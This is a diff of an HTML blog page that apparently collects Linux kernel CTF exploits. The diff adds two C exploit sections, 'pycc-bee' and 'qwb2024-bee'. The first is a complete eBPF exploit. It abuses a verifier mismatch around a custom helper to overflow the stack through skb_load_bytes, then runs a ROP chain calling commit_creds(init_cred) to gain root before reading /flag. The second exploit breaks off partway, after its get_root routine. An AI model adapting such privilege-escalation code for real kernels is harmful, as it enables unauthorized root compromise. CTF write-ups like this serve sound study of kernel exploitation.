@@ -9,7 +9,7 @@
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://cnitlrt.github.io/kernel01/" /><meta property="og:image" content="https://cnitlrt.github.io/logo.jpg"/><meta property="article:section" content="" />
 <meta property="article:published_time" content="2023-11-09T09:15:58+08:00" />
-<meta property="article:modified_time" content="2025-05-14T14:37:44+08:00" /><meta property="og:site_name" content="My cool site" />
+<meta property="article:modified_time" content="2025-05-20T21:52:04+08:00" /><meta property="og:site_name" content="My cool site" />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://cnitlrt.github.io/logo.jpg"/>
 
@@ -34,8 +34,8 @@
                             "url": "https:\/\/cnitlrt.github.io\/images\/Apple-Devices-Preview.png",
                             "width":  3200 ,
                             "height":  2048 
-                        }],"genre": "page","wordcount":  30633 ,
-        "url": "https:\/\/cnitlrt.github.io\/kernel01\/","datePublished": "2023-11-09T09:15:58+08:00","dateModified": "2025-05-14T14:37:44+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+                        }],"genre": "page","wordcount":  31752 ,
+        "url": "https:\/\/cnitlrt.github.io\/kernel01\/","datePublished": "2023-11-09T09:15:58+08:00","dateModified": "2025-05-20T21:52:04+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
                     "@type": "ImageObject",
@@ -10550,6 +10550,394 @@ A: heap overflow (off by null| off by x)</p>
 </span></span><span class="line"><span class="cl">git checkout Ubuntu-hwe-5.15-5.15.0-127.137_20.04.1
 </span></span></code></pre></td></tr></table>
 </div>
+</div><h2 id="pycc-bee">pycc-bee</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;/home/ubuntu/security-research/linux_kernel_images/is_ebpf/linux-6.10.9/samples/bpf/bpf_insn.h&#34; // https://github.com/torvalds/linux/blob/master/samples/bpf/bpf_insn.h</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/bpf.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define LOG_BUF_SZ (0x1000)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">log_buf</span><span class="p">[</span><span class="n">LOG_BUF_SZ</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define SYSCHK(x)                     \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    ({                                \
+</span></span></span><span class="line"><span class="cl"><span class="cp">        typeof(x) __res = (x);        \
+</span></span></span><span class="line"><span class="cl"><span class="cp">        if (__res == (typeof(x))-1)   \
+</span></span></span><span class="line"><span class="cl"><span class="cp">            err(1, &#34;SYSCHK(&#34; #x &#34;)&#34;); \
+</span></span></span><span class="line"><span class="cl"><span class="cp">        __res;                        \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    })
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">map_fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Hello world&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">key</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">size_t</span> <span class="n">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{};</span>
+</span></span><span class="line"><span class="cl">        <span class="n">attr</span><span class="p">.</span><span class="n">map_type</span> <span class="o">=</span> <span class="n">BPF_MAP_TYPE_ARRAY</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">attr</span><span class="p">.</span><span class="n">key_size</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">attr</span><span class="p">.</span><span class="n">value_size</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">attr</span><span class="p">.</span><span class="n">max_entries</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">attr</span><span class="p">.</span><span class="n">map_flags</span> <span class="o">=</span> <span class="n">BPF_F_RDONLY_PROG</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">map_fd</span> <span class="o">=</span> <span class="nf">SYSCHK</span><span class="p">(</span><span class="nf">syscall</span><span class="p">(</span><span class="n">SYS_bpf</span><span class="p">,</span> <span class="n">BPF_MAP_CREATE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">bpf_insn</span> <span class="n">prog</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_9</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// set r1 = map_fd
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">BPF_LD_MAP_FD</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">map_fd</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// *(s64 *)(fp - 8) = 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// *(s64 *)(fp - 0x10) = 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">BPF_ST_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">,</span> <span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ST_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">,</span> <span class="o">-</span><span class="mh">0x10</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// r1 = fp - 8
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">,</span> <span class="o">-</span><span class="mi">8</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// call bpf_iscc(r1)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">BPF_RAW_INSN</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_CALL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">212</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// r7 = *(s64 *)(fp - 0x10)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// r7 verify为0,实际为1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">,</span> <span class="o">-</span><span class="mh">0x10</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_MUL</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// ctx offset to len
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="n">BPF_REG_9</span><span class="p">),</span> <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_3</span><span class="p">,</span> <span class="n">BPF_REG_10</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_3</span><span class="p">,</span> <span class="o">-</span><span class="mh">0x8</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_REG</span><span class="p">(</span><span class="n">BPF_REG_4</span><span class="p">,</span> <span class="n">BPF_REG_7</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">BPF_ALU64_IMM</span><span class="p">(</span><span class="n">BPF_ADD</span><span class="p">,</span> <span class="n">BPF_REG_4</span><span class="p">,</span> <span class="mi">4</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">BPF_RAW_INSN</span><span class="p">(</span><span class="n">BPF_JMP</span> <span class="o">|</span> <span class="n">BPF_CALL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">BPF_FUNC_skb_load_bytes</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_2</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">BPF_EXIT_INSN</span><span class="p">()};</span>
+</span></span><span class="line"><span class="cl">    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">prog_attr</span> <span class="o">=</span> <span class="p">{};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">prog_attr</span><span class="p">.</span><span class="n">prog_type</span> <span class="o">=</span> <span class="n">BPF_PROG_TYPE_SOCKET_FILTER</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">prog_attr</span><span class="p">.</span><span class="n">insn_cnt</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">prog</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_insn</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">prog_attr</span><span class="p">.</span><span class="n">insns</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">prog</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">prog_attr</span><span class="p">.</span><span class="n">license</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="s">&#34;GPL&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">prog_attr</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">prog_attr</span><span class="p">.</span><span class="n">log_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">log_buf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">prog_attr</span><span class="p">.</span><span class="n">log_size</span> <span class="o">=</span> <span class="n">LOG_BUF_SZ</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">prog_fd</span> <span class="o">=</span> <span class="nf">syscall</span><span class="p">(</span><span class="n">SYS_bpf</span><span class="p">,</span> <span class="n">BPF_PROG_LOAD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">prog_attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">prog_attr</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">prog_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="n">log_buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;syscall&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="n">log_buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">data_buf</span><span class="p">[</span><span class="mi">4096</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">payload</span> <span class="o">=</span> <span class="n">data_buf</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">rop</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff8130d3de</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff8130d3de</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff8130d3de</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1234</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1235</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1236</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1237</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff8105d725</span><span class="p">;</span> <span class="c1">// pop rdi; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff82c52b00</span><span class="p">;</span> <span class="c1">// init_cred
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff810c0ca0</span><span class="p">;</span> <span class="c1">// commit_creds
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff8108aaf0</span><span class="p">;</span> <span class="c1">// vfork
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">struct</span> <span class="n">__sk_buff</span> <span class="n">md</span> <span class="o">=</span> <span class="p">{};</span>
+</span></span><span class="line"><span class="cl">    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">test_prog</span> <span class="o">=</span> <span class="p">{};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">test_prog</span><span class="p">.</span><span class="n">test</span><span class="p">.</span><span class="n">data_in</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">data_buf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">test_prog</span><span class="p">.</span><span class="n">test</span><span class="p">.</span><span class="n">data_size_in</span> <span class="o">=</span> <span class="mi">1024</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">test_prog</span><span class="p">.</span><span class="n">test</span><span class="p">.</span><span class="n">ctx_in</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">md</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">test_prog</span><span class="p">.</span><span class="n">test</span><span class="p">.</span><span class="n">ctx_size_in</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">md</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">test_prog</span><span class="p">.</span><span class="n">prog_type</span> <span class="o">=</span> <span class="n">BPF_PROG_TEST_RUN</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">test_prog</span><span class="p">.</span><span class="n">test</span><span class="p">.</span><span class="n">prog_fd</span> <span class="o">=</span> <span class="n">prog_fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="nf">syscall</span><span class="p">(</span><span class="n">SYS_bpf</span><span class="p">,</span> <span class="n">BPF_PROG_TEST_RUN</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">test_prog</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">test_prog</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;test run&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;cat /flag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="qwb2024-bee">qwb2024-bee</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//  musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/bpf.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/bpf_common.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">bpf</span><span class="p">(</span><span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="k">union</span> <span class="n">bpf_attr</span> <span class="o">*</span><span class="n">attrs</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">attrs</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">attrs</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">error_exit</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">get_root</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">getuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">error_exit</span><span class="p">(</span><span class="s">&#34;[-] didn&#39;t got root</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
